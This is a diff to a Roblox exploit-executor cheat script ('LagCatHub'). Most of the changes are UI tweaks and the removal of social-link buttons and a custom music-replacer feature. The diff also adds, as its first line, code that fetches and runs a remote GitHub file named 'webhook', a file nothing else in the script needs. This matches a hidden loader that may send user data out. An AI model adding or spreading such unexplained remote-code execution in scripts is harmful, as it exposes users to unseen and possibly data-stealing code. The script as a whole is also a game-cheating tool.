@@ -1,4 +1,6 @@
-local Fluent = loadstring(game:HttpGet("https://raw.githubusercontent.com/hu1a0hu9acc-sketch/Nhin-Con-Cac/refs/heads/main/Hu1a0Gui.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TDDuym500/lol/refs/heads/main/webhook"))()
+
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
 local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
 
@@ -11,7 +13,7 @@ local Window = Fluent:CreateWindow({
     Size = UDim2.fromOffset(480, 360),
     Acrylic = true,
     Theme = "Dark",
-    MinimizeKey = Enum.KeyCode.RightAlt,
+    MinimizeKey = Enum.KeyCode.Home,
 
     UserInfo = true,
     UserInfoTop = false,
@@ -373,36 +375,6 @@ local Options = Fluent.Options
         end
     })
 
-
-
-    Tabs.Dev:AddButton({
-        Title = "Youtube",
-        Description = "Copy link to Subscribe to Youtube channel!",
-        Callback = function()
-            setclipboard("")
-            Fluent:Notify({
-                Title = "Notification",
-                Content = "Successfully copied to the clipboard!",
-                SubContent = "", -- Optional
-                Duration = 3 
-            })
-        end
-    })
-
-
-    Tabs.Dev:AddButton({
-        Title = "Facebook",
-        Description = "Copy link to join facebook group!",
-        Callback = function()
-            setclipboard("")
-            Fluent:Notify({
-                Title = "Notification",
-                Content = "Successfully copied to the clipboard!",
-                SubContent = "", -- Optional
-                Duration = 3 
-            })
-        end
-    })
 
 -- Tabs.Farm
 
@@ -5050,182 +5022,6 @@ getgenv().RunService = game:GetService("RunService")
 local folderPath = "LagCatHub/Assets"
 if not isfolder("LagCatHub") then makefolder("LatCatHub") end
 if not isfolder(folderPath) then makefolder(folderPath) end
-
--- 🎵 Track list (FULL)
-getgenv().tracks = {
-    ["None"] = "",
-    ["----------- UST -----------"] = nil,
-    ["A BRAVE SOUL (MS 4 Killer VS MS 4 Survivor)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/A%20BRAVE%20SOUL%20(MS%204%20Killer%20VS%20MS%204%20Survivor).mp3",
-    ["BEGGED (MS 4 Coolkidd vs MS 4 007n7)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/BEGGED%20(MS%204%20Coolkidd%20vs%20MS%204%20007n7).mp3",
-    ["DOOMSPIRE (HairyTwinkle VS Pedro.EXE)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/DOOMSPIRE%20-%20(HairyTwinkle%20VS%20Pedro.EXE).mp3",
-    ["ECLIPSE (xX4ce0fSpadesXx vs dragondudes3)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/ECLIPSE%20(xX4ce0fSpadesXx%20vs%20dragondudes3).mp3",
-    ["ERROR 264 (Noob Cosplay VS Yourself)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/ERROR%20264%20-%20(Noob%20Cosplay%20VS%20Yourself).mp3",
-    ["GODS SECOND COMING (NOLI VS. 007n7)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/GODS%20SECOND%20COMING%20(NOLI%20VS.%20007n7).mp3",
-    ["Entreat (Bluudude Vs 118o8)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Entreat%20(Bluudude%20Vs%20118o8).mp3",
-    ["Implore (Comic vs Savior)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Implore%20(Comic%20vs%20Savior)%20-%20YouTube.mp3",
-    ["Leftovers (Remix Vanity Jason Vs All)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Leftovers%20(Remix%20Vanity%20Jason%20Vs%20All).mp3",
-    ["ORDER UP (Elliot VS c00lkidd)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/ORDER%20UP%20-%20(Elliot%20VS%20c00lkidd).mp3",
-    ["PARADOX (Guest 666 Vs Guest 1337)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/PARADOX%20(Guest%20666%20Vs%20Guest%201337).mp3",
-    ["TRUE BEAUTY (PRETTYPRINCESS vs 226w6)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/TRUE%20BEAUTY%20(PRETTYPRINCESS%20vs%20226w6).mp3",
-    ["Fall of a Hero (SLASHER vs GUEST 1337)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/%5BSLASHER%20vs%20GUEST%201337%20-%20LAST%20MAN%20STANDING%5D%20Fall%20of%20a%20Hero%20-%20Forsaken%20UST.mp3",
-    ["21ST CENTURY HUMOR (MLG Chance vs Hood Irony Whistle Occurrence)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/21ST%20CENTURY%20HUMOR%20-%20Last%20Man%20Standing%20(MLG%20Chance%20vs%20Hood%20Irony%20Whistle%20Occurrence)%20%20Forsaken%20UST.mp3",
-    ["SHATTERED GRACE (GR1MX 1x1x1x1 vs. ANGEL SHEDLETSKY)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/SHATTERED%20GRACE%20%5BGR1MX%201x1x1x1%20vs.%20ANGEL%20SHEDLETSKY%20LAST%20MAN%20STANDING%5D%20(Roblox%20Forsaken%20UST).mp3",
-    ["----------- Scrapped LMS -----------"] = nil,
-    ["THE DARKNESS IN YOUR HEART (Old 1x4 Vs Shedletsky)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/THE%20DARKNESS%20IN%20YOUR%20HEART%20(Old%201x4%20Vs%20Shedletsky).mp3",
-    ["MEET YOUR MAKING (c00lkidd ~ 1x4 Vs 007n7 ~ Shedletsky)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/MEET%20YOUR%20MAKING%20(c00lkidd%20~%201x4%20Vs%20007n7%20~%20Shedletsky).mp3",
-    ["A Creation Of Sorrow (Hacklord vs The Heartbroken)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/A%20Creation%20Of%20Sorrow%20(Hacklord%20vs%20The%20Heartbroken).mp3",
-    ["Debth (Natrasha Vs Mafioso)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Debth%20(Natrasha%20Vs%20Mafioso).mp3",
-    ["ETERNAL HOPE, ETERNAL FIGHT (Old LMS)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/ETERNAL%20HOPE,%20ETERNAL%20FIGHT%20(Old%20LMS).mp3",
-    ["Receading Lifespan (Barber Jason Vs Bald Two Time)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Receading%20Lifespan%20(Barber%20Jason%20Vs%20Bald%20Two%20Time).mp3",
-    ["VIP Jason LMS (VIP Jason Vs All)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/VIP%20Jason%20LMS%20(VIP%20Jason%20Vs%20All).mp3",
-    ["Jason Hate This Song"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/California%20Gurls%20%20Audio%20Edit%20-%20Neonick.mp3",
-    ["----------- Official LMS -----------"] = nil,
-    ["A GRAVE SOUL (NOW, RUN) [All Killers Vs All Survivors]"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/A%20GRAVE%20SOUL%20(NOW,%20RUN)%20%5BAll%20Killers%20Vs%20All%20Survivors%5D.mp3",
-    ["Plead (c00lkidd Vs 007n7)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Plead%20(c00lkidd%20Vs%20007n7).mp3",
-    ["SMILE (Cupcakes Vs All)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/SMILE%20(Cupcakes%20Vs%20All)%20.mp3",
-    ["Vanity (Vanity Jason Vs All)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Vanity%20(Vanity%20Jason%20Vs%20All).mp3",
-    ["Obsession (Gasharpoon Vs All)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Obsession%20(Gasharpoon%20Vs%20All).MP3",
-    ["Burnout (Diva Vs Ghoul)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Burnout%20(Diva%20Vs%20Ghoul).mp3",
-    ["Close To Me (Annihilation Vs Friend)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Close%20To%20Me%20(Annihilation%20Vs%20Friend).mp3",
-    ["Creation Of Hatred (1X4 Vs Shedletsky)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Creation%20Of%20Hatred%20(1X4%20Vs%20Shedletsky).mp3",
-    ["Through Patches of Violet (Hacklord vs The Heartbroken)"] = "https://github.com/NyansakenHub/NyansakenHub/raw/refs/heads/main/Through%20Patches%20of%20Violet%20(Hacklord%20vs%20The%20Heartbroken).mp3"
-}
-
--- 🔽 Dropdown options
-local options = {}
-for k, _ in pairs(getgenv().tracks) do
-    table.insert(options, k)
-end
-
--- 🌐 Globals
-getgenv().selectedSong = "None"
-getgenv().customSongUrl = nil
-getgenv().originalSongId = nil
-getgenv().isPlaying = false
-getgenv().isToggleOn = false
-
--- 💾 Download song (only one at a time)
-local function downloadTrack(name, url)
-    if not url or url == "" then return nil end
-    local path = folderPath .. "/" .. name:gsub("[^%w]", "_") .. ".mp3"
-    if not isfile(path) then
-        local req = http_request or syn.request or request
-        local res = req({Url = url, Method = "GET"})
-        local data = res.Body or res.BodyRaw
-        if data and #data > 0 then writefile(path, data) end
-    end
-    return path
-end
-
--- 🔍 Find LastSurvivor
-local function getLastSurvivor()
-    local t = workspace:FindFirstChild("Themes")
-    if t then return t:FindFirstChild("LastSurvivor") end
-    return nil
-end
-
--- ▶️ Set & play track
-local function setLastSurvivorSong(songName)
-    local ls = getLastSurvivor()
-    if not ls then return end
-    local url = getgenv().tracks[songName]
-    if not url or url == "" then return end
-    local path = downloadTrack(songName, url)
-    if not path then return end
-    local sound = getcustomasset(path)
-    if not getgenv().originalSongId then
-        getgenv().originalSongId = ls.SoundId
-    end
-    ls.SoundId = sound
-    ls:Play()
-    getgenv().isPlaying = true
-end
-
--- 🎛️ GUI Section
-Tabs.Custom:AddSection("↳ Last Man Standing")
-
-Tabs.Custom:AddToggle("LMSReplacerSong", {
-    Title = "LMS Replacer Song",
-    Default = false,
-    Callback = function(Value)
-        getgenv().isToggleOn = Value
-        local ls = getLastSurvivor()
-        if not Value then
-            if ls and getgenv().originalSongId then
-                ls.SoundId = getgenv().originalSongId
-                ls:Play()
-            end
-            getgenv().isPlaying = false
-            getgenv().originalSongId = nil
-        else
-            if getgenv().selectedSong ~= "None" then
-                setLastSurvivorSong(getgenv().selectedSong)
-            elseif getgenv().customSongUrl then
-                local path = downloadTrack("Custom_LMS_Song", getgenv().customSongUrl)
-                if path then
-                    local sound = getcustomasset(path)
-                    if ls then
-                        getgenv().originalSongId = ls.SoundId
-                        ls.SoundId = sound
-                        ls:Play()
-                    end
-                end
-            end
-        end
-    end
-})
-
-local dropdown = Tabs.Custom:AddDropdown("CustomLMSSong", {
-    Title = "Seclect LMS Song",
-    Values = options,
-    Multi = false,
-    Default = "None",
-    Callback = function(Value)
-        getgenv().selectedSong = Value
-        -- ❌ Gỡ bỏ dòng gây lỗi
-        -- dropdown:SetValue(Value)
-    end
-})
-
-Tabs.Custom:AddInput("CustomLMSSongURL", {
-    Title = "Custom LMS",
-    Default = "",
-    Placeholder = "Enter raw MP3 URL",
-    Callback = function(input)
-        if input and input ~= "" then
-            getgenv().customSongUrl = input
-            if getgenv().isToggleOn then
-                local ls = getLastSurvivor()
-                if ls then
-                    local path = downloadTrack("Custom_LMS_Song", input)
-                    local sound = getcustomasset(path)
-                    if not getgenv().originalSongId then
-                        getgenv().originalSongId = ls.SoundId
-                    end
-                    ls.SoundId = sound
-                    ls:Play()
-                    getgenv().isPlaying = true
-                end
-            end
-        end
-    end
-})
-
--- ♻️ Maintain playback
-RunService.Heartbeat:Connect(function()
-    local ls = getLastSurvivor()
-    if getgenv().isToggleOn and ls then
-        -- chỉ phát lại nếu chưa phát hoặc đã dừng
-        if not ls.IsPlaying then
-            setLastSurvivorSong(getgenv().selectedSong)
-        end
-    elseif not getgenv().isToggleOn and ls and getgenv().originalSongId and ls.SoundId ~= getgenv().originalSongId then
-        -- khi tắt toggle, khôi phục nhạc gốc
-        ls.SoundId = getgenv().originalSongId
-        ls:Play()
-        getgenv().isPlaying = false
-    end
-end)
 
 
 
